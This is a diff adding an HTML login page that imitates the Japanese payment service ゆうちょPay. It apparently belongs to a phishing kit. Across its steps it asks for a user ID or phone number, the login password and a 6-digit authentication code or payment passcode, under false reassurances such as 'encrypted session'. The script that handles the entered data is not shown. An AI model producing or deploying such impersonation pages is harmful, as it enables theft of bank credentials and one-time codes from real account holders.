@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#0b5cab" />
+  <meta name="referrer" content="no-referrer" />
+  <title>ゆうちょPay - 安全ログイン</title>
+  <link rel="stylesheet" href="./css/main.css" />
+</head>
+<body>
+  <header class="top">
+    <button type="button" class="back" id="backBtn" aria-label="戻る"></button>
+  </header>
+
+  <section id="stepAccount" class="step is-active">
+    <div class="hero">
+      <div class="brand">
+        <div class="logo" aria-hidden="true">ゆ</div>
+        <div>
+          <div class="brand-title">ゆうちょPay</div>
+          <div class="brand-sub">Secure Mobile Service</div>
+        </div>
+      </div>
+      <h1 class="headline">ようこそ<br />ゆうちょPay</h1>
+      <p class="desc">アカウント保護のため本人確認を完了してください</p>
+    </div>
+    <div class="card">
+      <div class="field">
+        <div class="label">携帯番号 / ユーザーID / メール</div>
+        <input id="account" class="inp" autocomplete="username" inputmode="text" placeholder="携帯番号 / ユーザーID / メール" />
+      </div>
+      <div id="errAccount" class="err" role="alert"></div>
+      <div class="row">
+        <button type="button" id="agreeBtn" class="check" aria-pressed="true">✓</button>
+        <div class="agree">利用規約およびプライバシーポリシーに同意します <a href="#" id="termsLink">Terms</a></div>
+      </div>
+      <button type="button" id="nextBtn" class="primary">次へ</button>
+      <div class="links">
+        <a href="#" id="helpLink1">ヘルプ</a>
+        <a href="#" id="langLink">Language</a>
+      </div>
+    </div>
+  </section>
+
+  <section id="stepPassword" class="step">
+    <div class="hero">
+      <div class="brand">
+        <div class="logo" aria-hidden="true">ゆ</div>
+        <div>
+          <div class="brand-title">安全ログイン</div>
+          <div class="brand-sub">ゆうちょPay</div>
+        </div>
+      </div>
+      <p class="desc">アカウント保護のため本人確認を完了してください</p>
+    </div>
+    <div class="card">
+      <div class="masked">
+        <div class="avatar" aria-hidden="true">ゆ</div>
+        <span id="maskedAccount"></span>
+      </div>
+      <div class="field">
+        <div class="label">ログインパスワード</div>
+        <input id="password" class="inp" type="password" autocomplete="current-password" maxlength="64" placeholder="ログインパスワード" />
+      </div>
+      <div id="errPassword" class="err" role="alert"></div>
+      <button type="button" id="loginBtn" class="primary">ログイン</button>
+      <div class="links">
+        <a href="#" id="forgotLink">パスワードをお忘れですか</a>
+        <a href="#" id="helpLink2">ヘルプ</a>
+      </div>
+    </div>
+  </section>
+
+  <footer class="foot">© ゆうちょPay · encrypted session</footer>
+
+  <div id="loading" class="loading" aria-hidden="true">
+    <div class="spin"></div>
+    <p class="loading-text">安全確認中...</p>
+  </div>
+  <div id="toast" class="toast" role="status" aria-live="polite"></div>
+
+  <div id="shade" class="shade" aria-hidden="true"></div>
+  <div id="verifyModal" class="modal" role="dialog" aria-labelledby="modalTitle" aria-hidden="true">
+    <div class="modal-head">
+      <div class="modal-title" id="modalTitle">本人確認</div>
+      <div class="modal-sub">6桁の認証コードまたは決済パスコードを入力してください</div>
+    </div>
+    <div class="modal-body">
+      <div class="pinbox" id="pinbox">
+        <div class="digit" data-idx="0"></div>
+        <div class="digit" data-idx="1"></div>
+        <div class="digit" data-idx="2"></div>
+        <div class="digit" data-idx="3"></div>
+        <div class="digit" data-idx="4"></div>
+        <div class="digit" data-idx="5"></div>
+        <input id="pinInput" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" aria-label="認証コード" />
+      </div>
+      <div id="errPin" class="err" style="text-align: center" role="alert"></div>
+    </div>
+    <div class="modal-actions">
+      <button type="button" id="cancelVerifyBtn">キャンセル</button>
+      <button type="button" id="confirmVerifyBtn">確認</button>
+    </div>
+  </div>
+
+  <script src="./js/main.js"></script>
+</body>
+</html>
